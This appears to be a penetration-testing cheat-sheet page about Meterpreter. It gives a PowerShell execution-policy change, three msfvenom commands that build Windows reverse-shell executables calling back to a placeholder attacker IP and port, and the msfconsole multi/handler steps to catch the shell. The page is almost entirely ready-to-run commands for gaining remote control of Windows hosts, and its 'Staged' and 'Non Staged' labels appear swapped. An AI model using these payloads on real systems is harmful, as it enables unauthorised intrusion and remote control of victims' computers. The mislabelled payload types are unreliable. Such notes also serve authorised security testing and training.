---
title: Meterpreter
layout: default
parent: General Usage
nav_order: 1
---

PowerShell allow ps1:

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
```

* Regular Non-Staged

```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o /tmp/shell.exe
```

* Meterpreter Staged

```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=IP LPORT=PORT -f exe -o /tmp/shell.exe
```

* Meterpreter Non Staged

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT -f exe -o /tmp/shell.exe
```

To receive the incoming shell (change the set payload to the one you set):

```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter_reverse_https
set lhost IP
set lport PORT
exploit
```
